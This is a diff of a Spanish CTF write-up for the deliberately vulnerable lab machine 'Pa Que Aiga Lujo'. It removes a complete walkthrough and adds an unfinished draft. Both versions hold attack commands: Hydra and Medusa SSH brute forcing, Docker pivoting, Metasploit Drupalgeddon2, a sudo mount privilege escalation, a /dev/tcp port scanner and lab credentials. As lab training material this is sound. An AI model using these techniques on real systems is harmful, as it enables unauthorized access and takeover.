@@ -21,230 +21,256 @@
 
 ---
 
-## 🎯 Descripción
 
-**Pa Que Aiga Lujo** es una máquina vulnerable de The Hackers Labs que simula un entorno empresarial con múltiples capas de seguridad. El objetivo es comprometer el sistema completo mediante:
-
-1. **Enumeración web** para extraer nombres de usuarios
-2. **Ataque de fuerza bruta SSH** con Hydra
-3. **Descubrimiento de redes internas** (Docker)
-4. **Explotación de Drupal 8** (CVE-2018-7600)
-5. **Escalada de privilegios** mediante configuraciones inseguras de sudo
+# **📌 Write-up CTF: Lujo Collection - Enfoque en Escalada de Privilegios y Movimiento Lateral**
 
 ---
 
-## 🛠️ Tecnologías Utilizadas
+## **📂 1. Estructura del Entorno**
+Se organizó el espacio de trabajo en carpetas para mantener el orden y la claridad durante la ejecución del CTF:
 
-| Herramienta | Uso |
-|---|---|
-| **Netdiscover** | Descubrimiento de hosts en la red |
-| **Nmap** | Escaneo de puertos y servicios |
-| **Hydra** | Ataque de fuerza bruta SSH |
-| **fscan** | Escaneo interno de la red Docker |
-| **SSH Port Forwarding** | Pivoting a redes internas |
-| **Metasploit** | Explotación de Drupalgeddon2 |
-| **GTFOBins** | Escalada de privilegios via mount |
+```bash
+$ ls
+ exploit   files   notes   post   recon
+```
+
+- **`recon/`**: Contiene scripts y resultados de reconocimiento.
+- **`files/`**: Diccionarios, credenciales y archivos extraídos.
+- **`notes/`**: Notas manuales y observaciones clave.
+- **`exploit/`**: Exploits personalizados o scripts de ataque.
+- **`post/`**: Post-explotación y escalada de privilegios.
+
+> **🔹 Nota**: Todo está configurado en **ZSH** para agilizar comandos como `recon` y `enum`.
 
 ---
 
-## 🔍 Fase 1: Reconocimiento
-
-### Descubrimiento de Hosts
-
-```bash
-netdiscover -i eth1 -r 10.0.0.0/16
-```
-
-**Resultado:** IP víctima identificada: `10.0.4.91`
-
-### Escaneo de Puertos
+## **🔍 2. Reconocimiento Inicial (Nmap)**
+Se escaneó la IP objetivo IP  para identificar servicios expuestos:
 
 ```bash
-nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.91
-nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.91
+$ nmap -sV -p- -T4 IP
 ```
 
-**Puertos Abiertos:**
-- **Puerto 22** → OpenSSH 9.2p1 (Debian)
-- **Puerto 80** → Apache 2.4.62 (Tienda de artículos de lujo)
+### **📜 Resultados del Escaneo**
+| **Puerto** | **Estado** | **Servicio**          | **Versión**                     |
+|------------|------------|-----------------------|---------------------------------|
+| 22/tcp     | Abierto    | SSH                   | OpenSSH 9.2p1 Debian 2+deb12u7  |
+| 80/tcp     | Abierto    | HTTP                  | Apache 2.4.62 (Debian)          |
 
-### Enumeración Web
-
-Accediendo a `http://10.0.4.91`, encontramos una tienda llamada **LuxeCollection**. Del análisis del contenido extraemos posibles usuarios:
-
-```
-Carlos, Isabella, Alexandre, Miguel, Elena, Sophia, Victoria, 
-Anastasia, Roberto, James, Catherine, Margot, Valentina, Priscilla, Beatrice
-```
+> **🔹 Observaciones**:
+> - **SSH**: Versión moderna con soporte para ECDSA y ED25519.
+> - **HTTP**: Servidor Apache con título `LuxeCollection - Artículos de Lujo Exclusivos`.
 
 ---
 
-## 🔓 Fase 2: Acceso Inicial
+## **🌐 3. Análisis de la Web (Puerto 80)**
+Se inspeccionó el sitio web para extraer información útil:
 
-### Ataque de Fuerza Bruta SSH
+### **🔎 Acciones Realizadas**
+1. **Inspección manual**:
+   - Se revisaron nombres de usuarios en productos, categorías y metadatos.
+   - Se identificaron nombres como `Sophia`, `Luxe`, `Admin`, etc.
 
-```bash
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.4.91 -t 64
-```
+2. **Generación de diccionario de usuarios**:
+   ```bash
+   $ cat users.txt
+   Sophia
+   Admin
+   Luxe
+   cipote
+   ```
 
-✅ **Credenciales encontradas:**
-```
-Usuario: Sophia
-Contraseña: dolphins
-```
-
-### Acceso al Sistema
-
-```bash
-ssh Sophia@10.0.4.91
-```
-
----
-
-## 🌐 Fase 3: Pivoting Interno
-
-### Enumeración de Interfaces
-
-```bash
-ip a
-```
-
-**Descubrimiento:** Interfaz `docker0` con IP `172.17.0.1` → Indica contenedores activos
-
-### Ping Sweep en Subred Docker
-
-```bash
-for i in {1..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
-```
-
-**Host activo encontrado:** `172.17.0.2`
-
-### Transferencia de Herramientas
-
-```bash
-# En máquina atacante
-python3 -m http.server 80
-
-# En máquina víctima
-wget http://10.0.4.12/fscan
-chmod +x fscan
-./fscan -h 172.17.0.2
-```
-
-**Resultado:** Drupal 8 vulnerable a **CVE-2018-7600** (Drupalgeddon2)
+3. **Posibles contraseñas**:
+   - Se usó un diccionario personalizado (`diccionario.txt`) y alternativas como `rockyou.txt`.
 
 ---
 
-## 💣 Fase 4: Explotación Docker
+## **🔓 4. Fuerza Bruta en SSH (Medusa/Hydra)**
+Se intentó autenticarse en el servicio SSH con el usuario `Sophia` y contraseñas del diccionario.
 
-### Port Forwarding SSH
-
+### **🛠️ Comando con Medusa**
 ```bash
-ssh -L 8080:172.17.0.2:80 Sophia@10.0.4.91
+$ medusa -U users.txt -P /usr/share/wordlists/rockyou.txt -h 192.168 -M ssh -t 4 -f -O medusa_out.txt
 ```
+> **🔹 Resultado**:
+> ```
+> [22][ssh] host: IP login: Sophia password: dolphins
+> ```
 
-### Explotación con Metasploit
-
+### **🛠️ Alternativa con Hydra**
 ```bash
-msfconsole
-use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS localhost
-set RPORT 8080
-run
+$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168 -t 4 -T 1 -u -V
 ```
+> **🔹 Resultado**:
+> ```
+> [22][ssh] host: IP login: Sophia password: dolphins
+> ```
 
-✅ **Shell obtenida:** `www-data` en el contenedor
-
-### Movimiento Lateral
-
-Buscando credenciales en Drupal:
-
+### **🔑 Acceso al Sistema**
 ```bash
-grep -r "password" /var/www/html/sites/default/settings.php
-```
-
-**Contraseña encontrada:** `ballenitafeliz` (usuario: `ballenita`)
-
-```bash
-su ballenita
-```
-
-### Escalada en Contenedor
-
-```bash
-sudo -l
-# Output: ballenita puede ejecutar /bin/ls y /bin/grep como root sin contraseña
-```
-
-Lectura de archivo secreto:
-
-```bash
-sudo -u root /bin/grep '' /root/secretitomaximo.txt
-# Output: ElcipotedeChocolate-CipotitoCipoton
+$ ssh Sophia@IP
+Password: dolphins
 ```
 
 ---
 
-## 👑 Fase 5: Escalada Final
+## **🔐 5. Reconocimiento Interno**
+Una vez dentro, se enumeró el sistema para identificar vectores de escalada.
 
-### Acceso como cipote
-
+### **👥 Usuarios del Sistema**
 ```bash
-ssh cipote@10.0.4.91
-# Contraseña: ElcipotedeChocolate-CipotitoCipoton
+$ cat /etc/passwd | grep sh$
+```
+```plaintext
+root:x:0:0:root:/root:/bin/bash
+debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
+Sophia:x:1001:1001:,,,:/home/Sophia:/bin/bash
+cipote:x:1002:1002:,,,:/home/cipote:/bin/bash
 ```
 
-### Escalada a root
+> **🔹 Observación**: Existe un usuario `cipote` no documentado.
 
+### **🌐 Interfaces de Red**
 ```bash
-sudo -l
-# Output: cipote puede ejecutar /usr/bin/mount como root sin contraseña
+$ ip a
+```
+```plaintext
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    inet 127.0.0.1/8 scope host lo
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    inet 10.0.4.91/24 scope global dynamic enp0s3
+3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    inet 172.17.0.1/16 scope global docker0
+5: veth7d79586@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
+    link/ether 72:b4:9c:b3:44:9b brd ff:ff:ff:ff:ff:ff link-netnsid 0
 ```
 
-**Explotación vía GTFOBins:**
+> **🔹 Hallazgo**: Interfaz `docker0` con IP `172.17.0.1`, indicando contenedores Docker en ejecución.
 
+---
+
+## **🔄 6. Movimiento Lateral (Docker)**
+Se exploró la red interna para descubrir hosts adicionales.
+
+### **🔍 Ping Sweep en la Subred Docker**
 ```bash
-sudo /usr/bin/mount -o bind /bin/bash /bin/mount
-sudo mount
-# ¡Shell de root obtenida!
+$ for i in {1..254}; do (ping -c 1 172.17.0.$i | grep "bytes from" &); done
 ```
+```plaintext
+64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.034 ms
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.025 ms
+```
+
+> **🔹 Resultado**: Host activo en `172.17.0.2`.
+ssh -L 8080:172.17.0.2:80 Sophia@192.168
+The authenticity of host can't be established.
+ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168' (ED25519) to the list of known hosts.
+Sophia@192.168.80.21's password: 
+Linux TheHackersLabs-PaQueAigaLujo 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 26 19:26:26 2026 from 192.168
+Sophia@TheHackersLabs-PaQueAigaLujo:~$ nano target.txt 
+Sophia@TheHackersLabs-PaQueAigaLujo:~$ nano scan.sh
+Sophia@TheHackersLabs-PaQueAigaLujo:~$ chmod +x scan.sh
+Sophia@TheHackersLabs-PaQueAigaLujo:~$ ./scan.sh
+
+[+] Iniciando escaneo en el objetivo: 172.17.0.1
+[*] Port Active: 22
+[*] Port Active: 80
+
+
+[+] Iniciando escaneo en el objetivo: 172.17.0.2 # target
+
+# CODIGO DEL SCANPORT.SH
+ ```bash
+   #!/usr/bin/bash 
+
+while read host; do
+  echo -e "\n[+] Iniciando escaneo en el objetivo: $host"
+  for port in {1..1000}; do 
+    timeout 1 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null && echo "[*] Port Active: $port"
+  done
+  echo ""
+done < target.txt
+   ```
 
 ---
 
-## 🚩 Flags
+## **🎯 7. Próximos Pasos (TO-DO)**
+1. **Acceder al contenedor Docker** en `172.17.0.2`:
+   ```bash
+   $ ssh Sophia@172.17.0.2
+   ```
+   *O usar `nc` o `curl` si hay servicios expuestos.*
 
-### User Flag
-```
-f3e431cd1xxxxxxxxxxfcb2cc151e8
-```
+2. **Escalar privilegios** en el host principal:
+   - Verificar permisos de `sudo`:
+     ```bash
+     $ sudo -l
+     ```
+   - Buscar binarios SUID:
+     ```bash
+     $ find / -perm -4000 2>/dev/null
+     ```
+   - Revisar crontabs:
+     ```bash
+     $ crontab -l
+     $ ls -la /etc/cron*
+     ```
 
-### Root Flag
-```
-92f0383bbaxxxxxxd3087dc4636978
-```
+3. **Explotar el usuario `cipote`**:
+   - Buscar archivos con permisos especiales:
+     ```bash
+     $ find /home/cipote -type f -exec ls -la {} \;
+     ```
+   - Revisar historial de comandos:
+     ```bash
+     $ cat ~/.bash_history
+     ```
+# Identificación del CMS Drupal
+
+Utilizando wget para obtener el contenido del servidor interno
+    ```bash
+    wget -qO- http://172.17.0.2/
+   ```
+
+
+
+
+
+4. **Post-explotación**:
+   - Extraer hashes de `/etc/shadow`.
+   - Buscar archivos sensibles en `/var/www/`, `/opt/`, etc.
 
 ---
-
-## 📚 Lecciones Aprendidas
-
-| Concepto | Lección |
-|---|---|
-| **Enumeración Web** | Extraer información de aplicaciones públicas es crucial |
-| **Diccionarios Personalizados** | Mejorar wordlists con datos del objetivo |
-| **Pivoting** | Docker expone redes internas explotables |
-| **Configuración Insegura** | Permisos sudo mal configurados son críticos |
-| **Port Forwarding** | Técnica esencial para acceder a servicios internos |
+## **📌 Resumen de Hallazgos**
+| **Paso**               | **Resultado**                          | **Estado**       |
+|------------------------|----------------------------------------|------------------|
+| Reconocimiento inicial | Puertos 22 (SSH) y 80 (HTTP) abiertos | ✅ Completado     |
+| Fuerza bruta SSH       | Credenciales: `Sophia:dolphins`        | ✅ Completado     |
+| Reconocimiento interno | Usuario `cipote` y red Docker detectada| ✅ Completado     |
+| Movimiento lateral     | Host `172.17.0.2` encontrado           | ⏳ Pendiente      |
+| Escalada de privilegios| -                                      | ⏳ Pendiente      |
 
 ---
+## **🚀 Conclusión**
+El CTF presenta un entorno con:
+- **Acceso inicial** mediante fuerza bruta en SSH.
+- **Movimiento lateral** hacia contenedores Docker.
+- **Posibles vectores de escalada** en usuarios no estándar (`cipote`).
 
-## ⚠️ Notas de Seguridad
-
-- Nunca reutilizar contraseñas entre sistemas
-- Auditar permisos sudo regularmente
-- Aislar contenedores Docker adecuadamente
-- Mantener software actualizado (Drupal, OpenSSH)
-- Implementar WAF y IDS
+**🔧 Recomendación**: Continuar con el análisis del contenedor en `172.17.0.2` y revisar permisos en el sistema principal.
 
 ---
+> **📝 Nota final**: Mantener el entorno organizado (`recon/`, `notes/`, etc.) es clave para CTFs complejos.
+```
 
-**Creado para fines educativos en ciberseguridad** 🎓
